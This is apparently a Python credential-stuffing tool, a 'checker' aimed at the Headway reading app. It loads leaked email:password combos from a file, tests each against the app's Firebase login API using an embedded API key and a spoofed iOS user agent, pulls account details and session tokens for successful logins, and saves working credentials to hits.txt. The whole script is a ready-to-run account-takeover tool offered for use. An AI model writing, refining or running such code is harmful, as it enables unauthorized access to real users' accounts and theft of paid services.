import requests
print("HEADWAY CHECKER BY JASHGRO AND Bin_WorldXD")
print("Source Code : https://github.com/BlackHatDevX/Head-Way-Checker")
print("____________________________________________")
print("Note:")
print(" - Load combos in combo.txt file same checker directory")
print("___________________________________________")
print("Features:")
print(" - Open Source")
print(" - Proxyless")
print(" - Only Premium accounts goes to hits.txt")
print(" - No Leecher")
print(" - Fast as f")
print("\n")

show = input("Do you want to print Invalid Credentials too? y/N :")


def check_account(email, password):
    login_url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyAr0Cv76mypzoFWOHIR65LGiRQZuWE2Ww4"
    account_info_url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyAr0Cv76mypzoFWOHIR65LGiRQZuWE2Ww4"
    create_token_url = "https://us-central1-books-us.cloudfunctions.net/CreateToken2"

    # Prepare the request payload and headers for login
    login_payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    login_headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "User-Agent": "FirebaseAuth.iOS/10.9.0 com.headway.books/227.7 iPhone/15.7.5 hw/iPhone9_1",
        # Add other required headers
    }

    # Send login request
    login_response = requests.post(
        login_url, json=login_payload, headers=login_headers)
    login_data = login_response.json()

    # Check if login was successful
    if "idToken" in login_data:
        id_token = login_data["idToken"]

        # Prepare the request payload and headers for account info
        account_info_payload = {
            "idToken": id_token
        }
        account_info_headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            # Add other required headers
        }

        # Send account info request
        account_info_response = requests.post(
            account_info_url, json=account_info_payload, headers=account_info_headers)
        account_info_data = account_info_response.json()

        # Parse the required information from the account info response
        email = account_info_data["users"][0]["email"]
        email_verified = account_info_data["users"][0]["emailVerified"]
        created_at = account_info_data["users"][0]["createdAt"]

        # Prepare the request payload and headers for create token
        create_token_payload = {
            "data": {
                "isNewUser": False,
                "email": email,
                "fbLoginId": None,
                "uid": login_data["localId"],
                "name": None
            }
        }
        create_token_headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Authorization": f"Bearer {id_token}",
            # Add other required headers
        }

        # Send create token request
        create_token_response = requests.post(
            create_token_url, json=create_token_payload, headers=create_token_headers)
        create_token_data = create_token_response.json()

        # Parse the token from the create token response
        token = create_token_data["data"]["token"]

        # Return the relevant information
        return {
            "email": email,
            "email_verified": email_verified,
            "created_at": created_at,
            "token": token
        }

    # Login was not successful, return None
    return None


# Read the accounts from the file
with open("combo.txt", "r") as file:
    for line in file:
        try:
            email, password = line.strip().split(":")
            account_info = check_account(email, password)
            if account_info is not None:
                print("-----------------------")
                print("💚Account info:")
                print("Email:", account_info["email"])
                print("Password", password)
                print("Email Premium:", account_info["email_verified"])
                print("Checker by bit.ly/jashgro")
                print("-----------------------")
                f = open("hits.txt", "a")
                f.writelines("[HIT] -| "+email+":"+password +
                             " | Checker by bit.ly/jashgro | \n")
            else:
                if show == ("y" or "Y"):
                    print("🟥Invalid credentials for", email)
        except:
            pass
